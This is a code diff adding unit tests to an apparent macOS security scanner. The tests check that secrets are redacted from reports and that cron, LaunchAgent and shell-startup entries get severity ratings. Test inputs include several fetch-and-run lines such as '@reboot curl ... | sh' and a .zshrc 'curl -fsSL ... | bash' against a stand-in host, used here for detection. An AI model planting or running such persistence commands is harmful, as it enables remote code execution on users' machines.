@@ -162,3 +162,58 @@ describe('collectMac with a fake system (read-only, execFile args only)', () => 
     expect(calls.find(([c]) => c === '/usr/bin/crontab')![1]).toEqual(['-l']);
   });
 });
+
+import { redactCommand, cronProgramName } from '../src/main/mac-security-scan';
+
+describe('secrets never leave the scanner', () => {
+  const SECRETS = [
+    'hunter2pw', 'sk-live-ABCDEF1234567890abcdef', 'AKIAABCDEFGHIJKLMNOP', 'ghp_abcdefghijklmnop1234',
+    'tokenvalue123456', 'q=secretquery', 'Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MDEyMw', 'user:pw123@',
+  ];
+  const text = (v: unknown) => JSON.stringify(v);
+
+  it('redactCommand strips userinfo, queries, headers, assignments and long tokens', () => {
+    const out = redactCommand(
+      'curl -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" https://user:pw123@host.example/p?q=secretquery#frag ' +
+      '--token tokenvalue123456 API_KEY=hunter2pw AWS=AKIAABCDEFGHIJKLMNOP Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MDEyMw | sh');
+    for (const s of SECRETS) expect(out).not.toContain(s);
+    expect(out).toContain('host.example/p');
+    expect(out).toContain('| sh');
+  });
+
+  it('does not mangle ordinary long paths', () => {
+    const p = '/Applications/Some Long Application Name.app/Contents/MacOS/helper-tool-with-long-name';
+    expect(redactCommand(p)).toBe(p);
+  });
+
+  it('cron: informational lines report only the program, never the arguments', () => {
+    const line = '*/5 * * * * API_KEY=hunter2pw /Users/amy/bin/backup.sh --token tokenvalue123456 https://u:pw123@h.example/x?q=secretquery';
+    expect(cronProgramName(line)).toBe('backup.sh');
+    const r = analyzeMac(base({ entries: [{ source: 'Cron', location: 'crontab', name: cronProgramName(line), args: [line] }] }), HOME);
+    expect(r.findings[0].severity).toBe('low');
+    for (const s of SECRETS) expect(text(r)).not.toContain(s);
+  });
+
+  it('cron: a curl|sh line is high and quoted only redacted', () => {
+    const line = '@reboot curl -s https://u:pw123@h.example/i.sh?q=secretquery -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" | sh';
+    const r = analyzeMac(base({ entries: [{ source: 'Cron', location: 'crontab', name: cronProgramName(line), args: [line] }] }), HOME);
+    expect(r.findings[0].severity).toBe('high');
+    expect(text(r)).toContain('h.example/i.sh');
+    for (const s of SECRETS) expect(text(r)).not.toContain(s);
+  });
+
+  it('launcher args: inline commands are not quoted; curl|sh is quoted redacted', () => {
+    const r = analyzeMac(base({ entries: [
+      { source: 'LaunchAgent', location: HOME + '/Library/LaunchAgents/a.plist', name: 'a', program: '/bin/sh', args: ['-c', 'echo hunter2pw; API_KEY=hunter2pw run'] },
+      { source: 'LaunchAgent', location: HOME + '/Library/LaunchAgents/b.plist', name: 'b', program: '/bin/sh', args: ['-c', 'curl https://user:pw123@h.example/x?q=secretquery | sh'] },
+    ] }), HOME);
+    expect(r.findings.map((f) => f.severity).sort()).toEqual(['high', 'medium']);
+    for (const s of SECRETS) expect(text(r)).not.toContain(s);
+  });
+
+  it('shell startup lines are redacted when quoted', () => {
+    const r = analyzeMac(base({ rcFiles: [{ file: HOME + '/.zshrc', text: 'curl -fsSL https://user:pw123@h.example/i.sh?q=secretquery -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" | bash\n' }] }), HOME);
+    expect(r.findings).toHaveLength(1);
+    for (const s of SECRETS) expect(text(r)).not.toContain(s);
+  });
+});
